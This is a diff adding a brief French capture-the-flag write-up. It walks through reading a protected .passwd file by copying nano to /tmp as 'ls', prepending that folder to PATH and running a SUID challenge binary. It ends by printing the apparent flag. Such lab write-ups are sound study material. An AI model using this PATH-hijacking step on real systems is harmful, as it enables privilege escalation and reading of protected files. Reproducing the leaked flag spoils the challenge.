@@ -1,0 +1,20 @@
+Nous devons trouver le moyen de lire le fichier .passwd en prenant en compte les options -lA
+Pour ce faire, nous allons utiliser nano pour lequel les options -lA n’empêche en rien de lire le fichier.
+
+Commençons tout d’abord par créer un dossier dans le /tmp
+
+##### mkdir /tmp/exploit
+
+Ensuite nous devons utiliser la même technique que dans le challenge ELF System 1, c’est-à-dire SUID, donc nous allons copier le fichier binaire de nano dans notre dossier sous le nom de ls
+
+##### cp /usr/bin/nano /tmp/exploit/ls
+
+Il suffit ensuite de mettre a jour la variable globale $PATH
+
+##### export PATH=/tmp/exploit:$PATH
+
+En enfin exécuter le script
+
+#####  ./ch12
+
+Nous serons dans le fichier.passwd ou sera afficher le texte suivant : 8a95eDS/*e_T#
